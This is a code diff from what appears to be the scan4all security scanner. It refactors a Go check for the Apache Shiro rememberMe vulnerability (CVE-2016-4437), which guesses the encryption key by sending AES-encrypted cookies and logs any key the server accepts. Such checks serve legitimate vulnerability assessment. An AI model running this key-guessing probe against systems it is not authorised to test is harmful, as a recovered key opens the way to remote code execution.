@@ -8,9 +8,7 @@ import (
 	_ "embed"
 	"encoding/base64"
 	"fmt"
-	"github.com/hktalent/scan4all/lib"
-	"github.com/hktalent/scan4all/pkg"
-
+	"github.com/hktalent/scan4all/lib/util"
 	uuid "github.com/satori/go.uuid"
 	"io"
 	"log"
@@ -63,8 +61,8 @@ func aES_GCM_Encrypt(key []byte, Content []byte) string {
 func getkeylen(u string, indexlen int, rememberMe string) (int, error) {
 	var header = make(map[string]string, 1)
 	header["Cookie"] = "rememberMe=" + rememberMe
-	if req, err := pkg.HttpRequset(u, "GET", "", false, header); err == nil {
-		return lib.CheckShiroCookie(req.Header), nil
+	if req, err := util.HttpRequset(u, "GET", "", false, header); err == nil {
+		return util.CheckShiroCookie(req.Header), nil
 	}
 	return indexlen, nil
 }
@@ -78,13 +76,13 @@ func CVE_2016_4437(u string) (key string) {
 			RememberMe2 := aES_GCM_Encrypt(decodekey, Content) //AES GCM加密
 			if CBClen, err := getkeylen(u, indexlen, RememberMe1); err == nil {
 				if CBClen != indexlen {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s CBC-KEY: %s\n", u, key))
+					util.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s CBC-KEY: %s\n", u, key))
 					return key
 				}
 			}
 			if GCMlen, err := getkeylen(u, indexlen, RememberMe2); err == nil {
 				if GCMlen != indexlen {
-					pkg.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s GCM-KEY: %s\n", u, key))
+					util.GoPocLog(fmt.Sprintf("Found vuln Shiro CVE_2016_4437| URL: %s GCM-KEY: %s\n", u, key))
 					return key
 				}
 			}
